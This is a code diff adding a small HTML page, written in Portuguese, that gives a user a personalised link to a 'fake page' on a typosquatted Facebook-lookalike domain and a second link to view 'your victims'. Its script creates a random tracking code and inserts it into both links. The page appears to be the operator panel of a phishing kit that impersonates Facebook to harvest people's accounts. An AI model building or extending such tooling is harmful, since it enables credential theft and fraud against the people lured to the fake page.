@@ -1,0 +1,38 @@
+<html>
+
+<body>
+    <p>
+        Essa é sua página fake: <a target="_blank">https://faceboolk.herokuapp.com?postid=#cod#</a>
+    </p>
+
+    <p>
+        Aqui está suas vítimas: <a target="_blank">https://faceboolk.herokuapp.com/p/#cod#</a>
+    </p>
+</body>
+
+</html>
+
+<script>
+    const storage = window.localStorage;
+    let cod = storage.getItem('cod');
+    if (!cod) {
+        cod = uuidv4();
+        storage.setItem('cod', cod);
+    }
+
+    const az = document.getElementsByTagName('a');
+    for (let index = 0; index < az.length; index++) {
+        const element = az[index];
+        const url = element.innerHTML.replace('#cod#', cod)
+        element.href = url;
+        element.innerHTML = url;
+    }
+
+    function uuidv4() {
+        return 'xxxxxxxxxxxxxxxxx'.replace(/[x]/g, function (c) {
+            var r = Math.random() * 16 | 0,
+                v = c == 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+</script>
